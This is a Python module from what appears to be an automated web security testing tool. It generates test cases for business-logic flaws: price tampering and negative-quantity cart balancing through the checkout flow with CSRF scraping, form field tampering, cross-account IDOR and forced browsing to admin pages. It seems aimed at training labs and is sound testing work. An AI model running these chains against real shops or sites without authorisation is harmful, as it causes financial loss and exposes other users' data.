"""
Web-app business-logic playbooks (HTML/form/cookie targets, not JSON APIs).

These complement the API playbooks and only emit cases when the registry shows
web surface (crawled forms/links). Confirmation is HTML-based: response text,
status, before/after state, and - for purchasing flows - the target's own
"order placed / lab solved" signal.

Classes covered:
  - Purchasing-flow tampering (client-side price / quantity) WITH the full
    add-to-cart -> checkout chain and CSRF re-scraping.
  - Standalone parameter/price tampering on other forms.
  - Web IDOR (id/username in query or path, cross-account content).
  - Broken access control via forced browsing.
"""

from __future__ import annotations

from itertools import count

from ..core.registry import Endpoint, EndpointRegistry
from .schema import Severity, TestCase, TestStep, VulnClass

_counter = count(1)


def _tid() -> str:
    return f"WTC-{next(_counter):03d}"


_SENSITIVE_NUM = ("price", "amount", "total", "cost", "balance", "points", "quantity", "qty", "fee")
_ID_PARAMS = ("id", "user", "userid", "user_id", "account", "accountid", "account_id", "uid")
_PRIV_PATH = ("admin", "internal", "manage", "management", "staff", "moderator",
              "dashboard", "config", "settings", "roles", "permissions")
_SUCCESS = "['confirmed', 'order placed', 'order is', 'success', 'thank you', 'added to', 'updated']"
# The CONFIRMING signal must be the genuine win state, NOT a generic "order placed"
# (any cheap order says that -> false positive). Only the real solved/win banner counts.
SOLVED = ("status == 200 and ('is-solved' in text or 'congratulations' in text.lower() "
          "or 'solved the lab' in text.lower())")
# CSRF scrape pattern tolerant of quoted/unquoted values.
_CSRF_RE = r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)'


def _identities(identities):
    ids = list(identities or [])
    return (ids[0] if ids else None), (ids[1] if len(ids) > 1 else None)


def _is_web_form(ep: Endpoint) -> bool:
    return any(p.location == "form" for p in ep.parameters) or "crawl" in ep.source


def _form_field_names(ep: Endpoint) -> set[str]:
    return {p.name.lower() for p in ep.parameters if p.location == "form"} | {
        k.lower() for k in ep.form_defaults}


# --------------------------------------------------- 1. purchasing-flow tampering
def purchase_flow(registry: EndpointRegistry, identities) -> list[TestCase]:
    """The headline web business-logic exploit: tamper the client-controlled
    price (or quantity) in the add-to-cart form, then complete checkout, and
    confirm via the order/solve signal."""
    attacker, _ = _identities(identities)
    cases = []
    for ep in registry:
        if ep.method.upper() != "POST":
            continue
        fields = _form_field_names(ep)
        is_cart = "cart" in ep.path.lower() or "productid" in fields or "product_id" in fields
        has_price = "price" in fields                           # client-supplied price?
        if not (is_cart and has_price):
            continue                                            # quantity-only carts -> cart_balancing

        cart_action = ep.path                                   # e.g. /cart
        checkout_path = cart_action.rstrip("/") + "/checkout"
        product_page = ep.discovered_on or cart_action
        defaults = {k: v for k, v in ep.form_defaults.items() if k.lower() != "csrf"}

        # Tamper the client-side price down to a single minor unit.
        tamper = dict(defaults)
        for k in list(tamper):
            if k.lower() == "price":
                tamper[k] = "1"
        tactic = "client-supplied price set to 1 minor unit"

        steps = []
        n = count(1)
        # (1) Visit the product page (establishes context; scrape add-form CSRF if any).
        add_needs_csrf = "csrf" in {k.lower() for k in ep.form_defaults}
        steps.append(TestStep(step=next(n), description="Open product page",
                              method="GET", path=product_page, identity=attacker,
                              extract_regex=({"add_csrf": _CSRF_RE} if add_needs_csrf else {})))
        # (2) Add to cart with the tampered field.
        add_form = dict(tamper)
        if add_needs_csrf:
            add_form["csrf"] = "{add_csrf}"
        steps.append(TestStep(step=next(n), description=f"Add to cart ({tactic})",
                              method=ep.method, path=cart_action, identity=attacker,
                              form=add_form, follow_redirects=True))
        # (3) View cart and scrape the checkout CSRF.
        steps.append(TestStep(step=next(n), description="View cart, scrape checkout CSRF",
                              method="GET", path=cart_action, identity=attacker,
                              extract_regex={"ck_csrf": _CSRF_RE}))
        # (4) Place the order. (No verdict here - a placed order is not proof of the
        #     objective; only the genuine solved-state below confirms.)
        steps.append(TestStep(step=next(n), description="Checkout (place order)",
                              method="POST", path=checkout_path, identity=attacker,
                              form={"csrf": "{ck_csrf}"}, follow_redirects=True))
        # (5) Re-check the storefront for the winning/solved state.
        steps.append(TestStep(step=next(n), description="Confirm order / lab-solved state",
                              method="GET", path="/", identity=attacker,
                              success_condition=SOLVED))

        cases.append(TestCase(
            test_id=_tid(),
            vulnerability_class=VulnClass.PARAM_POLLUTION,
            hypothesis=(f"{ep.key}: purchasing workflow trusts client input ({tactic}); "
                        "an order can be placed for an unintended price."),
            risk_rating=Severity.HIGH,
            affected_endpoint=ep.key,
            business_impact="Buy goods for an attacker-chosen price (financial loss).",
            steps=steps,
            cleanup_steps=[],
            rag_source="WSTG-BUSL-01 / Excessive trust in client-side controls",
        ))
    return cases


# ----------------------------------------------------- 1b. cart-total balancing
def _field(names: set[str], *candidates) -> str | None:
    for c in candidates:
        for n in names:
            if n.lower() == c:
                return n
    return None


def cart_balancing(registry: EndpointRegistry, identities) -> list[TestCase]:
    """High-level purchasing logic flaw: when the cart trusts a client `quantity`
    (no client price), buy the expensive target for an unintended price by adding
    a cheap product with a large NEGATIVE quantity so the order total lands within
    store credit. Uses prices/credit captured during discovery."""
    import math
    attacker, _ = _identities(identities)
    cases = []
    for ep in registry:
        if ep.method.upper() != "POST":
            continue
        names = {p.name for p in ep.parameters if p.location == "form"} | set(ep.form_defaults)
        lower = {n.lower() for n in names}
        is_cart = "cart" in ep.path.lower() or {"productid", "product_id"} & lower
        qty_field = _field(names, "quantity", "qty")
        if not (is_cart and qty_field) or "price" in lower:     # price carts -> purchase_flow
            continue

        pid_field = _field(names, "productid", "product_id") or "productId"
        redir_field = _field(names, "redir")
        cart_action = ep.path
        checkout_path = cart_action.rstrip("/") + "/checkout"
        catalog = registry.catalog
        base_form = {}
        if redir_field:
            base_form[redir_field] = ep.form_defaults.get(redir_field, "PRODUCT")

        steps, n = [], count(1)
        if len(catalog) >= 2:
            target_id = max(catalog, key=catalog.get)            # jacket = most expensive
            fillers = {k: v for k, v in catalog.items() if k != target_id and v > 0}
            filler_id = min(fillers, key=fillers.get)            # cheapest offset item
            jp, fp = catalog[target_id], catalog[filler_id]
            credit = registry.store_credit or 10000              # default £100
            q = max(1, math.ceil((jp - credit) / fp))            # units to subtract
            while jp - q * fp <= 0 and q > 1:                    # keep the total positive
                q -= 1
            total = jp - q * fp
            tactic = (f"jacket(id={target_id} @ {jp}) ×1 + filler(id={filler_id} @ {fp}) "
                      f"×{-q} -> total {total} ≤ credit {credit}")
            steps.append(TestStep(step=next(n), description="Open target product page",
                                  method="GET", path=f"/product?productId={target_id}",
                                  identity=attacker))
            steps.append(TestStep(step=next(n), description="Add target ×1",
                                  method=ep.method, path=cart_action, identity=attacker,
                                  form={**base_form, pid_field: target_id, qty_field: "1"},
                                  follow_redirects=True))
            steps.append(TestStep(step=next(n), description=f"Add cheap filler ×{-q} (negative)",
                                  method=ep.method, path=cart_action, identity=attacker,
                                  form={**base_form, pid_field: filler_id, qty_field: str(-q)},
                                  follow_redirects=True))
        else:
            # Fallback when no catalog: single negative quantity (won't solve multi-item labs).
            tactic = "single negative quantity"
            steps.append(TestStep(step=next(n), description="Add target with negative quantity",
                                  method=ep.method, path=cart_action, identity=attacker,
                                  form={**base_form, pid_field: ep.form_defaults.get(pid_field, "1"),
                                        qty_field: "-1"}, follow_redirects=True))

        steps.append(TestStep(step=next(n), description="View cart, scrape checkout CSRF",
                              method="GET", path=cart_action, identity=attacker,
                              extract_regex={"ck_csrf": _CSRF_RE}))
        steps.append(TestStep(step=next(n), description="Checkout (place order)",
                              method="POST", path=checkout_path, identity=attacker,
                              form={"csrf": "{ck_csrf}"}, follow_redirects=True))
        steps.append(TestStep(step=next(n), description="Confirm order / lab-solved state",
                              method="GET", path="/", identity=attacker, success_condition=SOLVED))

        cases.append(TestCase(
            test_id=_tid(),
            vulnerability_class=VulnClass.PARAM_POLLUTION,
            hypothesis=(f"{ep.key}: purchasing workflow trusts client quantity; "
                        f"buy target for an unintended price via cart balancing ({tactic})."),
            risk_rating=Severity.HIGH,
            affected_endpoint=ep.key,
            business_impact="Buy goods for an attacker-chosen price (financial loss).",
            steps=steps,
            rag_source="WSTG-BUSL-01 / High-level logic vulnerability"))
    return cases


# ----------------------------------------------------- 2. standalone form tampering
def parameter_tampering(registry: EndpointRegistry, identities) -> list[TestCase]:
    attacker, _ = _identities(identities)
    cases = []
    for ep in registry:
        if ep.method.upper() not in {"POST", "PUT"} or not _is_web_form(ep):
            continue
        # The cart form is handled by purchase_flow; skip to avoid duplicates.
        if "cart" in ep.path.lower():
            continue
        fields = _form_field_names(ep)
        target = next((n for n in fields if any(h in n for h in _SENSITIVE_NUM)), None)
        if not target:
            continue
        defaults = {k: v for k, v in ep.form_defaults.items() if k.lower() != "csrf"}
        tampered = "-1" if target in ("quantity", "qty") else "1"
        form = {**({k: v for k, v in defaults.items()}), target: tampered}
        needs_csrf = "csrf" in {k.lower() for k in ep.form_defaults}
        steps = []
        if needs_csrf and ep.discovered_on:
            steps.append(TestStep(step=1, description="Scrape CSRF", method="GET",
                                  path=ep.discovered_on, identity=attacker,
                                  extract_regex={"csrf": _CSRF_RE}))
            form["csrf"] = "{csrf}"
        steps.append(TestStep(step=len(steps) + 1, description=f"Tamper {target}={tampered}",
                              method=ep.method, path=ep.path, identity=attacker, form=form,
                              follow_redirects=True,
                              success_condition=f"status in (200, 201, 302) and "
                                                f"any(w in text.lower() for w in {_SUCCESS})"))
        cases.append(TestCase(
            test_id=_tid(), vulnerability_class=VulnClass.PARAM_POLLUTION,
            hypothesis=f"{ep.key}: server trusts client-supplied '{target}'.",
            risk_rating=Severity.HIGH, affected_endpoint=ep.key,
            business_impact=f"Manipulating '{target}' yields an unintended outcome.",
            steps=steps, rag_source="WSTG-BUSL-01"))
    return cases


# ----------------------------------------------------- 3. web IDOR (cross-account)
def web_idor(registry: EndpointRegistry, identities) -> list[TestCase]:
    import re
    attacker, victim = _identities(identities)
    if not (attacker and victim):
        return []
    cases = []
    for ep in registry:
        if ep.method.upper() != "GET":
            continue
        id_param = next((p.name for p in ep.parameters if p.name.lower() in _ID_PARAMS), None)
        path_has_id = bool(re.search(r"\{[^}]+\}", ep.path))
        if not id_param and not path_has_id:
            continue
        query = {id_param: victim} if id_param else None
        path = re.sub(r"\{[^}]+\}", victim, ep.path) if path_has_id else ep.path
        cases.append(TestCase(
            test_id=_tid(), vulnerability_class=VulnClass.BOLA_IDOR,
            hypothesis=f"{ep.key}: '{attacker}' can view '{victim}'s resource (web IDOR).",
            risk_rating=Severity.HIGH, affected_endpoint=ep.key,
            business_impact="Cross-account data exposure (web IDOR).",
            steps=[TestStep(step=1, description=f"{attacker} requests {victim}'s resource",
                            method="GET", path=path, identity=attacker, query=query,
                            success_condition=f"status == 200 and '{victim}' in text")],
            rag_source="OWASP API1:2023 BOLA (web)"))
    return cases


# ----------------------------------------------------- 4. forced-browse access control
def forced_browse_access(registry: EndpointRegistry, identities) -> list[TestCase]:
    attacker, _ = _identities(identities)
    cases = []
    for ep in registry:
        if ep.method.upper() != "GET" or not any(h in ep.path.lower() for h in _PRIV_PATH):
            continue
        cases.append(TestCase(
            test_id=_tid(), vulnerability_class=VulnClass.PRIV_ESCALATION,
            hypothesis=f"{ep.key}: privileged page reachable by a low-privileged user.",
            risk_rating=Severity.HIGH, affected_endpoint=ep.key,
            business_impact="Unauthorized access to privileged functionality.",
            steps=[TestStep(step=1, description=f"{attacker} force-browses privileged page",
                            method="GET", path=ep.path, identity=attacker, follow_redirects=False,
                            success_condition="status == 200 and any(w in text.lower() for w in "
                                              "['admin', 'delete user', 'manage', 'all users', 'staff'])")],
            rag_source="OWASP API5:2023 BFLA / WSTG-ATHZ-01"))
    return cases


def run_all(registry: EndpointRegistry, identities=None) -> list[TestCase]:
    cases: list[TestCase] = []
    cases += purchase_flow(registry, identities)          # client-side price tampering
    cases += cart_balancing(registry, identities)         # quantity / multi-item logic flaw
    cases += parameter_tampering(registry, identities)
    cases += web_idor(registry, identities)
    cases += forced_browse_access(registry, identities)
    return cases
